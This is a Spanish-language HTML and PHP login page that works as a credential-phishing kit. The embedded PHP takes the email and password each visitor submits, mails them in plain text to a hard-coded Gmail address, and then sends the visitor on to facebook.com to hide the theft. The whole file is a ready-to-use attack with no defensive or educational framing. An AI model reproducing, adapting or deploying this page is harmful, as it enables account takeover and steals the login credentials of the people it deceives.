<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }

        .login-container h2 {
            color: #333;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
        }

        .input-group input {
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        .input-group input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Iniciar sesión</h2>
        <form action="index.php" method="post">
            <div class="input-group">
                <label for="email">Correo electrónico:</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="input-group">
                <label for="password">Contraseña:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="input-group">
                <input type="submit" value="Iniciar sesión">
            </div>
        </form>
    </div>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $email = $_POST["email"];
        $password = $_POST["password"];

        // Aquí puedes agregar la lógica para enviar el correo electrónico
        $destinatario = "fabiverguero@gmail.com";
        $asunto = "Inicio de sesión";
        $mensaje = "Correo electrónico: $email\nContraseña: $password";
        
        mail($destinatario, $asunto, $mensaje);

        // Redirigir al usuario a Facebook después de enviar el correo
        header("Location: https://www.facebook.com");
        exit();
    }
    ?>
</body>
</html>
